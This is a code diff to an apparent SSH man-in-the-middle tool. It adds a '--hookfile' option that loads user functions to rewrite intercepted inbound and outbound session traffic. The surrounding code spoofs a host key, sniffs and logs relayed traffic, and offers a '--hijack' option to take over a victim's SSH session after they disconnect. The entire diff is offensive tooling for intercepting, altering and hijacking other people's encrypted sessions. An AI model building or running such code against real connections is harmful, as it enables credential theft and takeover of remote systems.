@@ -216,6 +216,8 @@ def main(args):
     global DST_IP
     global DST_PORT
     global host_key
+    global inhook
+    global outhook
 
     sock = None
     dst_sock = None
@@ -227,7 +229,7 @@ def main(args):
     except Exception as e:
         print e
         print_bad("[x.x] Unable to open keyfile %s" % args.spoof_key)
-        print_bad("[-_-] Might need to generate with: ssh-keygen -t rsa -N "" -f my.key")
+        print_bad("[-_-] Might need to generate with: ssh-keygen -t rsa -N \"\" -f id_rsa")
         sys.exit()
 
     if args.lhost:
@@ -238,6 +240,29 @@ def main(args):
         DST_IP = args.rhost
     if args.rport:
         DST_PORT = args.rport 
+
+
+    if args.hookfile:
+        import imp
+        # if inbound_hook == outbound_hook file, no biggie
+        try:
+            imp.load_source("hooks",args.hookfile)
+            try:
+                inhook = sys.modules["hooks"].inbound_hook
+                print_purp("Loaded inbound_hook from %s" % args.hookfile)
+            except:
+                pass
+
+            try:
+                outhook = sys.modules["hooks"].outbound_hook
+                print_purp("Loaded outbound_hook from %s" % args.hookfile)
+            except:
+                pass
+
+        except Exception as e:
+            print e
+            pass
+
 
     # Only care about these, since we might just be piping plain text through an ssh tunnel instead of sniffing
     if not DST_IP:
@@ -456,6 +481,7 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag):
 
     if filtering:
         ssh_sniff.netkit.init_client_buffer(in_chan,out_chan)
+        
     
     while True and not kill_switch.is_set():    
         # since we're not using select()
@@ -472,7 +498,11 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag):
             
                 if filtering:
                     inb = ssh_sniff.netkit.inbound_filter(inb) 
-                
+        
+                # defined with --hook <hookfile> => def inbound_hook(inbound_msg):
+                if inhook:
+                    inb = inhook(inb,)
+
                 if len(inb):
                     #print "Post filter inb: %s" % repr(inb) 
                     in_chan.send(inb)    
@@ -496,13 +526,16 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag):
         
         if in_chan.recv_ready():
             outb = get_bytes(in_chan)    
-            
 
             if len(outb):
                 log_buffer+=outb
 
                 if filtering:
                     outb = ssh_sniff.netkit.outbound_filter(outb) 
+
+                # defined with --hook <hookfile> => def inbound_hook(inbound_msg):
+                if outhook:
+                    outb = outhook(outb)
 
                 if not len(outb):
                     continue
@@ -535,13 +568,14 @@ def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag):
                 resp_expected = True
                 inb = ""
     
-    try:
-        if ssh_sniff.netkit.client_buffer.hijack_flag == True:
-            print "Setting Hijack"
-            hijack_flag.set()
-    except Exception as e:
-        print e 
-        pass
+    if filtering:
+        try:
+            if ssh_sniff.netkit.client_buffer.hijack_flag == True:
+                print "Setting Hijack"
+                hijack_flag.set()
+        except Exception as e:
+            print e 
+            pass
     ######
     ##/end while True and not kill_switch.is_set():    
     ######
@@ -783,11 +817,13 @@ if __name__ == "__main__":
     ssh_type = parser.add_mutually_exclusive_group()
     ssh_type.add_argument("--subsystem","-S",help="Execute the given subsystem (scp/sftp/ssh/netconf/etc)")
     ssh_type.add_argument("--execute","-e",help="Execute a single command")
-    ssh_type.add_argument("--interactive","-i",action="store_true",help="Requests a shell w/pty (default)"+CLEAR)
+    ssh_type.add_argument("--interactive","-i",action="store_true",help="Requests a shell w/pty (default)")
+
+    parser.add_argument("--hookfile",help="Will import inbound_hook and/or outbound_hook functions/utilize after netfilter, if any.")
     
     parser.add_argument("-f","--filtering",help="Filter input and output w/lil_netkit",action="store_true")
     parser.add_argument("-?","--cisco",help="For when you're filtering on a connection with a Cisco CLI device",action="store_true")
-    parser.add_argument("-j","--hijack",help="Hijack ssh session after target quits",action="store_true")
+    parser.add_argument("-j","--hijack",help="Hijack ssh session after target quits"+CLEAR,action="store_true")
     
     args = parser.parse_args()
     
